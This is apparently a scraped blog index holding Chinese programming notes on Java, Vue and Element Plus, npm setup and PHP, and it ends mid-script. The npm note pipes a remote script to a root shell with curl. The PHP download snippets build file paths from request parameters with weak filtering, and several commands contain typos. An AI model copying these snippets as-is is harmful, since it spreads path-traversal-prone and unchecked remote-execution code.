另存为Hello.java并打开cmd并切换到当前目录。在cmd中输入以下内容以编译并运行： 12javac Hello.javajava Hello 这是我们的第一个程序。掌握基础操作后，你可以使用你喜欢的IDE进行开发。我偏向使用VSCode（理论上Android Studio应该也可以）。 Java基本内容程序结构Java程序是以类为单位的，类则是一种自定义数据结构（类似于C中的结构体struct）。上面的程序包含了一个public类型的class（类），Hello是这个类的类名，这名称需和文件名同名。和C语言一样，Java也是大小写敏感的。习惯上将类名的每个单词首字母大写。 这个类中包含了一个main方法（也就是函数），作为这个Java程序的运行起点。这个方法中包含了该程序的所有逻辑，和C非常相似。 注释Java注释和C/C++基本一样，支持//和/*、*/，同时也支持另一种： 1234/***这是一个注释*它可以自动生成文档*/ 后两种都不能嵌套。这和C/C++一致。 数据类型Java是强类型语言。它共有8种基本数据类型： 整型：int（4字节）、short（2字节）、long（8字节）、byte（1字节） 浮点类型：float（4字节）、double（8字节） char类型 boolean（布尔）类型 这些都是关键字，用于声明对应类型的变量。 关于整型，和C差不多，有几点要注意：Java没有无符号类型整数。在整数后加L或l表示long类型整数，前缀0X或0x表示16进制整数，前缀0B或0b表示2进制整数，前缀0表示8进制数。为了可读性，还可以用下划线_分割整数：例如0b1111_0100这样的形式都是合法的。 关于浮点类型，double的使用相较于float更精确。浮点数后缀有两种：F或f表示float类型，而D或d表示double类型。不加后缀默认为double类型。也可以用16进制表示浮点数值：由于0.125=2的-3次幂，故可表示成0x1.0p-3。同时，还有三个特殊的浮点数值：正无穷大，负无穷大，NaN（Not a Number，不是一个数字）。例如0/0的结果就是NaN。可用Double.isNaN()可以检测一个变量是否为数值。另外，浮点数值采用二进制系统表示，因而不能精确表示1/10。此时可以使用BigDecimal类作为替代。 关于char类型：char原本表示单个字符。不过如今部分Unicode字符需要两个char来表示。和C一样，单引号表示字符，双引号表示字符串，反斜杠表示转义符。另外，可以直接用诸如\\u2122而不加引号的方式表示字符，比如： 1public static void main(String\\u005B\\u005D args) 也就是说，这种Unicode转义字符会在编译前被处理。因此使用反斜杠时一定注意。 关于boolean类型：C中没有布尔类型，而是使用int类型替代。Java中boolean类型只有true和false两个值。它和整数不能相互转换。这可以预防很多潜在的编程错误（例如if(x=0)在C语言中永远为假）。 Java的变量声明和C/C++基本一样，都是关键字 变量名的形式。同样可以在声明时对变量进行初始化（例如int a=5）。和C++一样，Java的声明可以在代码中的任何地方。用关键字final可以声明常量，这种变量只能被赋值一次。final就相当于C中的const关键字（const也是Java的关键字，不过Java并没有用它）。常量名一般习惯全部大写。常量也可以声明在main外部，类内部，使用关键字static final即可： 12345public class Example{ public static final int DAY_OF_WEEK = 7; ...} 运算符这和C/C++基本一致：+ - * /表示四则运算，%表示整数求模运算。对于除法，整数被0除会产生异常，而浮点数被0除则会得到无穷大或者NaN结果。 Java中有一个很有用的Math库，用来进行各种数学运算，并且还有一些数学常量。 Math.sqrt(x)：返回一个数值的平方根 Math.pow(x,a)：返回x的a次幂。参数x和a以及返回值都是double类型 Math.floorMod(x,a)：返回x对a取余的结果。它的存在是为了修补%运算不能正确处理负数的问题：负数的模显然应该是正数 Math.sin/cos/tan/atan/atan2：常用三角函数 Math.exp/log/log10：指数函数和它的反函数，以及以10为底的对数 Math.PI/E：两个近似表示π和e的常量 在源文件顶部加上这行代码，就可以省略这些方法/常量的Math.前缀了： 1import static java.lang.Math.*; 数据类型转换和强制类型转换，和C/C++基本相同。此外，Java还有Math.round方法，可以对浮点数进行四舍五入： 12double x = 9.997;int nx = (int)Math.round(x); 由于Math.round返回的是long类型，所以需要用(int)显式转换，避免数据丢失。 和C/C++一样，Java也有+=,-=,*=,/=和%=这几个结合赋值和运算符的运算符。左右数据类型不同时会发生强制类型转换，将运算结果转换成左值的类型。自增，自减运算符和C/C++完全一样，不需要说明。 Java中的逻辑运算符和C/C++一致，且支持短路特性。Java也支持三目运算符?:。下面的表达式`` 1x&gt;y?x:y; 返回x和y中较大的值。 位运算符有&amp; | ^ ~四个，分别表示与，或，异或，非。利用位运算我们可以获得一个整数的各个位，也就是掩码技术。另外它的运算对象如果是布尔类型，则返回值也是布尔类型，但这种方式不使用路求值。 &lt;&lt;和&gt;&gt;是移位运算符，用法和C/C++一样：将左值左移/右移右值相应的位数。&gt;&gt;&gt;会用0填充高位，而&gt;&gt;会用符号位填充高位。没有&lt;&lt;&lt;运算符。 枚举类型包括有限个命名的值，例如 12enum Size{SMALL, LARGE};Size s = Size.LARGE; 字符串Java字符串就是Unicode字符序列。Java没有内置字符串类型，而是在标准Java类库中提供了一个String预定义类。每个用双引号括起来的字符串都是String类的一个实例： 12String e = &quot;&quot;;String greeting = &quot;hello&quot;; substring方法可以从一个较大的字符串提取出一个子串： 12String greeting = &quot;hello&quot;;String s = greeting.substring(0,3); s是一个由”hel”组成的字符串。这方法表示从第0个字符开始，复制到第三个（不包括）为止。 +用来连接字符串。非字符串值被应用于这个操作符时，会被转换成字符串类型。任何一个Java对象都可以转换成字符串。如果需要用定界符分隔并连接，只需要用String.join静态方法： 1String s = String.join(&quot;,&quot;,&quot;a&quot;,&quot;b&quot;,&quot;c&quot;); 上面的s为a,b,c。 Java的String类对象被称为不可变字符串，也就是说一旦创建String对象，就不能对其进行修改。 利用String.equals方法检测两个字符串是否相等。例如s.equals(t)，返回s和t的比较结果。这里的s和t可以是字符串实例，也可以是字符串字面量。 char类型在Java中并不是很常用，因为现在很多字符需要两个char类型存储单元才能表示。因此尽量不要用char类型。 下面是常用的String类的方法： boolean equals(Object other) 字符串比较 boolean equalsIgnoreCase(String other) 字符串比较，忽略大小写 boolean startsWith(String str) 判断字符串是否以str开头 boolean endsWith(String str) 判断字符串是否以str结束 int length() 返回字符串的长度 String substring(int begin) String substring(int begin, int end) String toLowerCase() String toUpperCase() String trim() 返回删除左右空格的字符串 String join(CharSequence delimiter, CharSequence... elements) 就是上面的String.join方法 构建字符串时，可以用StringBuilder类避免每次都新建一个String对象，节省空间： 1234StringBuilder sb = new StringBuilder();sb.append(ch); //添加一个字符chsb.append(str); //添加一个字符串strString completedString = sb.toString(); //完成后的字符串 下面是StringBuilder类的方法： StringBuilder() 构造器 int length() StringBuilder append(String str/char c) 追加字符串/字符并返回this StringBuilder insert(String str/char c) 插入字符并返回this StringBuilder delete(int start, int end) 删除start到end（不包括end）的代码单元并返回this String toString() 返回一个内容相同的字符串 输入输出输入基于Scanner类。首先得声明Scanner对象，并与标准输入流System.in关联： 1Scanner in = new Scanner(System.in); 随后就可以使用Scanner类的各种方法实现输入操作了。比如： 12System.out.print(&quot;input your name:&quot;);String name = in.nextLine(); 要使用Scanner类，需要在源码开头导入java.util.* 1import java.util.*; 下面是Scanner类的方法： Scanner(InputStream in) 用给定的输入流创建一个Scanner对象 String nextLine() 读取下一行输入的内容 int nextInt() 读取下一个整数 int nextDouble() 读取下一个整数或浮点数 boolean hasNex() 检测输入中是否还有其他单词 boolean hasNextInt() boolean hasNextDouble() 用Scanner类进行格式化输出非常简单。使用System.out.print()方法可以直接输出x，用System.out.printf()可以格式化输出字符串。它的用法和C中的printf()完全一致。同时还新增了一些标志。详见用于printf的标志。同时，printf支持输出格式化日期与时间，但它已经被废弃（Deprecated），应当使用java.time包的方法。 此外，也可以使用String.format()静态方法创建一个 格式化的字符串而不输出： 1String message = String.format(&quot;Hllo, %s. Next year, you'll be %d&quot;, name, age); Scanner类也支持文件输入输出： 1Scanner in = new Scanner(Paths.get(&quot;myfile.exe&quot;), &quot;UTF-8&quot;); 文件名中包含反斜杠的话，则需要再多添加一个反斜杠转义。另外，其中的UTF-8可省略，缺省值为运行 该程序的机器的默认编码。不过为了兼容性尽量不要这么做。还有，路径支持相对路径，不过位置是相对于Java虚拟机的启动路径而言的：即命令解释器的当前路径。也可以用下面的方式得到路径位置： 1String dir = System.getProperty(&quot;user.dir&quot;); 流程控制Java中也有块（block）的概念。大多数内容都和C一致，除了嵌套的块中不能声明重名变量。下面说一下流程控制语句： if-else if-else 和C一样 while/do-while 和C一样 for 和C一样。不过添加了一种for each循环 switch 和C一样。不过从Java SE 7 开始，case标签可以是字符串字面量 break 后面可以带标签，用法和C中的goto一样。不过只能跳出语句块而不能跳入 continue 和C一样 大数值java.math包中有BigInterger和BigDecimal两个类，分别表示任意精度的整数和浮点数。使用静态方法valueOf()将普通数值转换成大数值： 1BigInterger a = BigInterger.valueOf(100); 然而因为Java没有提供运算符重载，所以不能用+-*/来进行大数的四则运算，只能使用它们的add subtract mulyiply divide mod compareTo方法进行加减乘除以及求模、比较运算。 数组和C差不多。不过[]得写在数据类型后而非变量名后： 12345int[] a;a = new int[100];int[] b = {1,2,3,5,7}a = {4,5,6,7}int[] d = new int[0]; //允许数组长度为0 可以用a.length获取数组a的长度，其余的用法和C无异：数组长度也是不可变的。如果需要长度可变则应该考虑使用array list。 数组除了可以用for循环遍历，也可以用for each循环遍历： 12345for(value : collection) statement//例如，对于int数组a而言：for(int num: a){ System.out.println(num);} 不过，打印数组还可以用System.out.println(Arrays.toString(a));来完成。 和上面类似，用Arrays.copyOf(array, length)可以复制数组。 现在可以说说main()函数的参数String[] args了。这是一个参数数组，和C的argv参数基本一样。不过这里的args[0]指示的不是程序名，而是第一个参数。 使用Arrays.sort(a)可以对数组进行排序。Arrays还有很多方法： Arrays.binarySearch(type[] a, type v) 二分搜索值v，返回下标或负数值（若为未查找到） Arrays.fill(typr[] a, type v) 用v填充数组 Arrays.equals(type[] a, type[] b) 数组比较，长度和对应位置的值都相等则返回true 多位数组使用这样的方式声明：int[][] a = new int[100][100]; 赋值和迭代等都和C差不多，按照java中一维数组的情况类推即可。 好了，这些就是Java的基本内容了。下一节是关于Java的面向对象体系的介绍。","link":"/2022/01/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%AF%87/"},{"title":"Java并发编程","text":"并发任务Runnable接口描述想运行的任务。 123public interface Runnable{ void run();} run中的代码会在一个线程中运行。 Exeucator执行任务，选择在哪个线程上执行任务。 123Runnable task = ()-&gt;{ ... };Executor exec = ...;exec.execute(task); 它有不同的工厂方法供不同情况调用 1exec = Executors.newCachedThreadPool(); 上面的是一个有很多短暂任务或者任务会消耗很多时间等待的优化型executor 1exec = Executors.newFixedThreadPool(nThreads); 这会产生一个数目固定的线程池。提交任务时，进行排队直到有可用线程。适用于计算密集型任务。可以用下面的代码获取可用处理器数目 1int processors = Runtime.getRuntime().availableProcessors(); 如果想将任务化整为零，并在最后汇总结果，那用Callable 123public interface Callable&lt;V&gt; { V call() throws Exception;} 要执行它，需要 123ExecutorService exec = Executors.newFixedThreadPool();Callable&lt;V&gt; task = ...;Future&lt;V&gt; result = exec.submit(task); 上面的Future表示未来可用的计算结果，有如下方法 12345V get() throws InterruptedException, ExecutionException;V get(long timeout, TimeUnit unit) throws InterruptedException, ExecutionException, TimeoutException;boolean cancel(boolean mayInterruptIfRunning); //未运行则取消，在运行则根据参数真假决定是否取消boolean isCancelled();boolean isDone(); 需要在线程中定时检查中断请求来让线程可中断 123456while(...){ if(Thread.currentThread().isInterrupted()) return null; other code}return result; 可以用invokeAll获取所有子任务结果集合 12345678String word = ...;Set&lt;Path&gt; paths = ...;List&lt;Callable&lt;Long&gt;&gt; tasks = new ArrayList&lt;&gt;();for(Path p : paths) tasks.add( ()-&gt;{return p中word出现次数});List&lt;Future&lt;Long&gt;&gt; results = executor.invokeAll(tasks);long total = 0;for(Future&lt;Long&gt; result : results) total += result.get(); 还有类似的invokeAny方法。它只要一个子任务无异常返回就返回，并且取消其他任务。这可以用来查找是否存在目标。 线程安全主程序中的变量对于线程不可见，这和缓存，指令重排序有关。 在这种问题中，只要给变量加上volatile前缀修饰就能让它对于其他任务都可见。 线程也可以使用原生的Thread管理任务执行。不过通常还是使用Executor。 123Runnable task = ()-&gt;{...};Thread thread = new Thread(task);thread.start(); 使用sleep让当前线程休眠一段时间，给其他线程执行机会 1234Runnable task = ()-&gt;{ ... Thread.sleep(millis);} 如果想等待线程完成，可以用join 1thredad.join(millis): //millis等待时限","link":"/2023/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"},{"title":"Web开发日志","text":"Vue篇关于SlotSlot，即“插槽”，是Vue的一个很重要的功能。通过插槽，可以将其他的组件“插入”到当前组件的某个槽位。这个机制的优点，就是在保留了子组件的控制的同时，也给父组件保留了一定的内容控制权。比如elementUI，它的很多功能都提供了slot来让我们插入自定义的内容。 用法它的用法很简单，分两部分。 组件 123...&lt;slot name=&quot;component-a&quot; :param1=&quot;123&quot;&gt;&lt;/slot&gt;... 父组件 12345&lt;Component&gt; &lt;template #component-a=&quot;{ param_1 }&quot;&gt; {{ param_1 }} &lt;/template&gt;&lt;/Component&gt; 上面是完整示例，一个具名的作用域插槽。它将子组件的一个参数param1通过解构赋值，回传到了父组件的形参param_1中，并在其中渲染出了它的值。同时，父组件将这部分template中的内容传入了子组件中，和子组件的其他部分内容一同渲染。 Vue-router历史模式的问题Vue-router支持多种历史模式。现在较为常用的一种就是HTML5模式。该模式下，浏览器显示的链接和正常的url一致，非常漂亮。但是需要后端路由的配置，否则会出现刷新页面出现404的问题。 除了HTML5模式，还有一种历史模式，叫做hash模式。它会在url中添加一个#来解决这个问题：#后面的部分在刷新时不会被后端认为是任何后端路由，因此也就不存在刷新后出现404的问题。 这一部分的配置在createRouter()的参数中进行配置： 123456789import { createRouter, createWebHashHistory, createWebHistory } from &quot;vue-router&quot;;export default createRouter({ // hash模式，无需后端配置 history: createWebHashHistory(), // html5模式，需要后端配置 history: createWebHistory(), routes: [ ... ]}); Vuex这是Vue官方出的状态管理插件。它用来管理整个单页程序的所有数据。 项目架构使用Vuex时，最佳实践一般是使用模块来组织各个部分的数据。假设我们的项目的store目录结构如下： 123456- store - modules - module1.js - module2.js - module3.js - index.js 那么，我们可以在每个模块中这么定义数据： 12345678910111213141516171819202122const auth = { state: { token: null }, mutations: { SET_TOKEN(state, token) { state.token = token; } }, actions: { setToken({ commit }, token) { commit(&quot;SET_TOKEN&quot;, token); } }, getters: { getToken(state) { return state.token; } }};export default auth; 然后在index.js中这么导入模块： 123456789101112import Vue from 'vue';import Vuex from 'vuex';import modules from './modules';Vue.use(Vuex);const store = new Vuex.Store({ modules, plugins: [localStoragePlugin]});export default store; 这种结构便于我们维护前端的数据模型。 VitepathResolve123456789101112131415161718192021222324import { defineConfig } from &quot;vite&quot;;import vue from &quot;@vitejs/plugin-vue&quot;;import path from &quot;path&quot;;import AutoImport from &quot;unplugin-auto-import/vite&quot;;import Components from &quot;unplugin-vue-components/vite&quot;;import { ElementPlusResolver } from &quot;unplugin-vue-components/resolvers&quot;;// https://vitejs.dev/config/export default defineConfig({ plugins: [ vue(), AutoImport({ resolvers: [ElementPlusResolver()], }), Components({ resolvers: [ElementPlusResolver()], }), ], resolve: { alias: { &quot;@&quot;: path.resolve(__dirname, &quot;./src&quot;), }, },}); ElementUI篇完整引入如果你对打包后的文件大小不是很在乎，那么使用完整导入会更方便。 12345678910// main.tsimport { createApp } from 'vue'import ElementPlus from 'element-plus'import 'element-plus/dist/index.css'import App from './App.vue'const app = createApp(App)app.use(ElementPlus)app.mount('#app') Volar 支持# 如果您使用 Volar，请在 tsconfig.json 中通过 compilerOptions.type 指定全局组件类型。 1234567// tsconfig.json{ &quot;compilerOptions&quot;: { // ... &quot;types&quot;: [&quot;element-plus/global&quot;] }} 自动导入首先你需要安装unplugin-vue-components 和 unplugin-auto-import这两款插件 1npm install -D unplugin-vue-components unplugin-auto-import 然后把下列代码插入到你的 Vite 或 Webpack 的配置文件中 Vite123456789101112131415161718// vite.config.tsimport { defineConfig } from 'vite'import AutoImport from 'unplugin-auto-import/vite'import Components from 'unplugin-vue-components/vite'import { ElementPlusResolver } from 'unplugin-vue-components/resolvers'export default defineConfig({ // ... plugins: [ // ... AutoImport({ resolvers: [ElementPlusResolver()], }), Components({ resolvers: [ElementPlusResolver()], }), ],}) Webpack12345678910111213141516// webpack.config.jsconst AutoImport = require('unplugin-auto-import/webpack')const Components = require('unplugin-vue-components/webpack')const { ElementPlusResolver } = require('unplugin-vue-components/resolvers')module.exports = { // ... plugins: [ AutoImport({ resolvers: [ElementPlusResolver()], }), Components({ resolvers: [ElementPlusResolver()], }), ],} 想了解更多打包 (Rollup, Vue CLI) 和配置工具，请参考 unplugin-vue-components 和 unplugin-auto-import。 Nuxt关于 Nuxt 用户, 你只需要安装 @element-plus/nuxt 即可. 1npm install -D @element-plus/nuxt 然后将下面的代码写入你的配置文件. 1234// nuxt.config.tsexport default defineNuxtConfig({ modules: ['@element-plus/nuxt'],}) 配置文档参考 docs. 手动导入Element Plus 提供了基于 ES Module 的开箱即用的 Tree Shaking 功能。 但你需要安装 unplugin-element-plus 来导入样式。 配置文档参考 docs. App.vue 123456789&lt;template&gt; &lt;el-button&gt;我是 ElButton&lt;/el-button&gt;&lt;/template&gt;&lt;script&gt; import { ElButton } from 'element-plus' export default { components: { ElButton }, }&lt;/script&gt; 12345678// vite.config.tsimport { defineConfig } from 'vite'import ElementPlus from 'unplugin-element-plus/vite'export default defineConfig({ // ... plugins: [ElementPlus()],}) WARNING 如果使用 unplugin-element-plus 并且只使用组件 API，你需要手动导入样式。 Example: 12import 'element-plus/es/components/message/style/css'import { ElMessage } from 'element-plus' 全局配置在引入 ElementPlus 时，可以传入一个包含 size 和 zIndex 属性的全局配置对象。 size 用于设置表单组件的默认尺寸，zIndex 用于设置弹出组件的层级，zIndex 的默认值为 2000。 完整引入： 123456import { createApp } from 'vue'import ElementPlus from 'element-plus'import App from './App.vue'const app = createApp(App)app.use(ElementPlus, { size: 'small', zIndex: 3000 }) 按需引入: 12345678910111213141516171819202122&lt;template&gt; &lt;el-config-provider :size=&quot;size&quot; :z-index=&quot;zIndex&quot;&gt; &lt;app /&gt; &lt;/el-config-provider&gt;&lt;/template&gt;&lt;script&gt;import { defineComponent } from 'vue'import { ElConfigProvider } from 'element-plus'export default defineComponent({ components: { ElConfigProvider, }, setup() { return { zIndex: 3000, size: 'small', } },})&lt;/script&gt; el-input的输入问题遇到过一次输入框无法输入的问题。查看了下官方文档发现是设计特性。正常来说，Input总是会响应输入事件，但是el-input是受控组件，所以它总是会更优先保证显示v-model绑定的数据值。这也就是为什么输入不会被正常响应的原因：没有给它加v-model，或者绑定了不存在/错误的对象。 不过我绑定不存在元素的时候居然没有报错，神奇…… vue3+vite相对路径打包12345678import { defineConfig } from 'vite'import vue from '@vitejs/plugin-vue'// https://vitejs.dev/config/export default defineConfig({ plugins: [vue()], base: './'})","link":"/2023/07/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/JavaScript/Web%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97/"},{"title":"用JavaScript写一个运行时间统计","text":"直接上代码。 js部分： 1234567891011121314151617181920212223242526272829303132/* filename:run_time.js */function time_calc(Y, M, D, h, m, s) { var seconds = 1000; var minutes = seconds * 60; var hours = minutes * 60; var days = hours * 24; var years = days * 365; var today = new Date(); var time = Date.UTC(today.getFullYear(), today.getMonth() + 1, today.getDate(), today.getHours(), today.getMinutes(), today.getSeconds()) - Date.UTC(Y, M, D, h, m, s); var year = Math.floor(time / years) var day = Math.floor((time / days) - year * 365); var hour = Math.floor((time - (year * 365 + day) * days) / hours); var minute = Math.floor((time - (year * 365 + day) * days - hour * hours) / minutes); var second = Math.floor((time - (year * 365 + day) * days - hour * hours - minute * minutes) / seconds); return { &quot;year&quot;: year, &quot;day&quot;: day, &quot;hour&quot;: hour, &quot;minute&quot;: minute, &quot;second&quot;: second };}function site_run_time(Y,M,D,h,m,s){ window.setInterval(function() { var time = time_calc(Y,M,D,h,m,s); document.getElementById('time_year').innerText = time.year; document.getElementById('time_day').innerText = time.day; document.getElementById('time_hour').innerText = time.hour; document.getElementById('time_minute').innerText = time.minute; document.getElementById('time_second').innerText = time.second; }, 1000);} HTML部分： 1234567891011121314151617181920212223242526&lt;!-- filename:index.html --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Demo&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;footer&quot;&gt; &lt;p&gt;系统已稳定运行： &lt;span id=&quot;time_year&quot;&gt;&lt;/span&gt;年 &lt;span id=&quot;time_day&quot;&gt;&lt;/span&gt;日 &lt;span id=&quot;time_hour&quot;&gt;&lt;/span&gt;时 &lt;span id=&quot;time_minute&quot;&gt;&lt;/span&gt;分 &lt;span id=&quot;time_second&quot;&gt;&lt;/span&gt;秒 &lt;/p&gt; &lt;/div&gt; &lt;script src=&quot;run_time.js&quot;&gt;&lt;/script&gt; &lt;script&gt; site_run_time(2021,1,1,0,0,0); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 解析主要利用window.setInterval(func_name,time)来实现反复执行。时间计算利用UNIX时间戳完成。 这里说一下UNIX时间戳：它表示自1970.1.1 00:00:00开始，过了多少毫秒。","link":"/2021/10/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/JavaScript/%E7%94%A8JavaScript%E5%86%99%E4%B8%80%E4%B8%AA%E8%BF%90%E8%A1%8C%E6%97%B6%E9%97%B4%E7%BB%9F%E8%AE%A1/"},{"title":"记一次npm和nodejs安装过程","text":"背景最近接触vue-cli，需要用到nodejs和npm。直接apt-get安装完成后发现版本过低，换源也不解决问题。最后必应解决了。 步骤首先彻底卸载nodejs和npm： 123sudo apt-get --purge npmsudo apt-get --purge nodejssudo apt-get --purge nodejs-legacy 然后去NodeSource获取换源指令并安装nodejs和npm，如下： 1234567# Using Ubuntucurl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -sudo apt-get install -y nodejs# Using Debian, as rootcurl -fsSL https://deb.nodesource.com/setup_14.x | bash -apt-get install -y nodejs 完成。 新的问题：npm not found我安装完成后发现，npm指令执行报错： 1-bash: /usr/local/bin/npm: No such file or directory 经过排查，发现是符号链接异常导致：npm会安装在/usr/bin/下，而在/usr/local/bin/下会创建软链接指向前者。所以只需要删掉原来的链接再手动创建就可以啦： 12cd /usr/local/bin/sudo rm npm &amp;&amp; sudo ln -s /usr/bin/npm /usr/local/bin/npm 这时候再输入npm -v，就可以看到npm正常运行了。 再安装直接扔/usr/local底下然后把bin加到$PATH就行，省时省力。 12345wget https://mirrors.ustc.edu.cn/node/latest-v20.x/node-v20.5.1-linux-x64.tar.gz \\&amp;&amp; tar -zxvf node-v20.5.1-linux-x64.tar.gz \\&amp;&amp; sudo mv node-v20.5.1-linux-x64 /usr/local/node \\&amp;&amp; echo 'export PATH=$PATH:&quot;/usr/local/node/bin&quot;' &gt;&gt; ~./bahsrc \\&amp;&amp; source ~/.bashrc 如果是Arch Linux的话，直接yay/pacman启动就行。真香啊.jpg 换源一条指令就行，执行结果会在~/.npmrc里。 1npm config set registry https://registry.npmmirror.com/ pnpm方法大同小异： 123# pnpm install &amp; change sourcenpm i pnpm -gpnpm config set registry https://registry.npmmirror.com/ 今天开发的时候发现源一直不对，而且换不了，遂排查环境变量，~/.npmrc等都没发现问题。然后项目内全局搜索，发现项目底下也有个.npmrc设置了registry字段。删掉后恢复正常。 推测是.npmrc可以被当前项目下的覆盖掉根目录下的。","link":"/2022/03/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/JavaScript/%E8%AE%B0%E4%B8%80%E6%AC%A1npm%E5%92%8Cnodejs%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/"},{"title":"PHP中三种鬼畜符号的用法","text":"=&gt;的用法在php中数组默认键名是整数，也可以自己定义任意字符键名（最好是有实际意义），如： 123$css=array('style'=&gt;'0'，‘color’=&gt;‘green‘)； 则$css['style']=='0'，$css['color']=='green'。 -&gt;的用法用来引用对象的成员（属性与方法）。相当于其他语言中的“.”。 1234567891011 $arr=['a'=&gt;123,'b'=&gt;456];//数组初始化 echo $arr['a'];//数组引用 print_r($arr);//查看数组 class A{ public $a=123; public $b=456; } $obj=new A(); echo $obj-&gt;a;//对象引用 print_r($obj);//查看对象?&gt; 输出结果： 123456123Array( [a] =&gt; 123 [b] =&gt; 456)123A Object( [a] =&gt; 123 [b] =&gt; 456) ::的用法双冒号操作符即作用域限定操作符Scope Resolution Operator可以访问静态、const和类中重写的属性与方法。 （1）Program List：用变量在类定义外部访问 12345678class Fruit { const CONST_VALUE = 'Fruit Color';} $classname = 'Fruit';echo $classname::CONST_VALUE; // As of PHP 5.3.0echo Fruit::CONST_VALUE;?&gt; （2）Program List：在类定义外部使用:: 123456789101112131415class Fruit { const CONST_VALUE = 'Fruit Color';}class Apple extends Fruit{ public static $color = 'Red'; public static function doubleColon() { echo parent::CONST_VALUE . &quot;\\n&quot;; echo self::$color . &quot;\\n&quot;; }}Apple::doubleColon();?&gt; （3）Program List：调用parent方法 123456789101112131415161718192021class Fruit{ protected function showColor() { echo &quot;Fruit::showColor()\\n&quot;; }} class Apple extends Fruit{ // Override parent's definition public function showColor() { // But still call the parent function parent::showColor(); echo &quot;Apple::showColor()\\n&quot;; }} $apple = new Apple();$apple-&gt;showColor();?&gt; （4）Program List：使用作用域限定符 123456789101112131415161718192021222324 class Apple { public function showColor() { return $this-&gt;color; } } class Banana12 { public $color; public function __construct() { $this-&gt;color = &quot;Banana is yellow&quot;; } public function GetColor() { return Apple::showColor(); } } $banana = new Banana; echo $banana-&gt;GetColor();?&gt; （5）Program List：调用基类的方法 123456789101112131415161718192021222324class Fruit{ static function color() { return &quot;color&quot;; } static function showColor() { echo &quot;show &quot; . self::color(); }} class Apple extends Fruit{ static function color() { return &quot;red&quot;; }} Apple::showColor();// output is &quot;show color&quot;!?&gt;","link":"/2021/07/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/PHP/PHP%E4%B8%AD%E4%B8%89%E7%A7%8D%E9%AC%BC%E7%95%9C%E7%AC%A6%E5%8F%B7%E7%9A%84%E7%94%A8%E6%B3%95/"},{"title":"PHP报错：无法加载zip.so","text":"解决方法很简单：将/etc/php/7.4/mods-available/目录下的.ini文件全部重命名为.so文件, 或删除对应的*.ini文件，如下： 12cd /etc/php/7.4/mods-available/sudo mv zip.ini zip.so 具体咋回事还不太清楚。网上还有另一种解决方法，是sudo vim /etc/ld.so.conf并增加一些内容，不过我这里似乎无效： 123456# 将/etc/ld.so.conf替换为如下内容include /etc/ld.so.conf.d/*.conf/usr/lib64/usr/lib/usr/local/lib/usr/local/lib64","link":"/2022/04/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/PHP/PHP%E6%8A%A5%E9%94%99%EF%BC%9A%E6%97%A0%E6%B3%95%E5%8A%A0%E8%BD%BDzip.so/"},{"title":"PHP文件下载代码","text":"其一1234567891011121314151617181920212223242526272829303132333435363738&lt;?php $filename = $_GET['filename']; // 修改这一行设置你的文件下载目录$download_path = &quot;ficheros/&quot;; // \b不能下载上一层目录的文件if(eregi(&quot;\\.\\.&quot;, $filename)) die(&quot;抱歉，你不能下载该文件！&quot;);$file = str_replace(&quot;..&quot;, &quot;&quot;, $filename); // 包含 .ht 的文件不能下载if(eregi(&quot;\\.ht.+&quot;, $filename)) die(&quot;抱歉，你不能下载该文件！&quot;); // \b创建文件下载路径$file = &quot;$download_path$file&quot;; // \b判断文件是否存在if(!file_exists($file)) die(&quot;抱歉，文件不存在！&quot;); // 文件类型，作为头部发送给浏览器$type = filetype($file); // 获取时间和日期$today = date(&quot;F j, Y, g:i a&quot;);$time = time(); // \b发送文件头部header(&quot;Content-type: $type&quot;);header(&quot;Content-Disposition: attachment;filename=$filename&quot;);header(&quot;Content-Transfer-Encoding: binary&quot;);header('Pragma: no-cache');header('Expires: 0');// 发送文件内容set_time_limit(0);readfile($file); ?&gt; 其二 其实这算html常规方式（ 1234&lt;button&gt; &lt;a href = &quot;http://localhost/down.zip&quot;&gt; 下载文件&lt;/button&gt; 其三传递参数： 1234&lt;button&gt; &lt;a href = &quot;http://localhost?f='down'&quot;&gt; 下载文件&lt;/button&gt; 查找文件并挑战到下载链接： 1234567891011121314&lt;?php$down = $_GET['f']; //获取文件参数$filename = $down.'.zip'; //获取文件名称$dir =&quot;down/&quot;; //相对于网站根目录的下载目录路径$down_host = $_SERVER['HTTP_HOST'].'/'; //当前域名//判断如果文件存在,则跳转到下载路径if(file_exists(__DIR__.'/'.$dir.$filename)){ header('location:http://'.$down_host.$dir.$filename);}else{ header('HTTP/1.1 404 Not 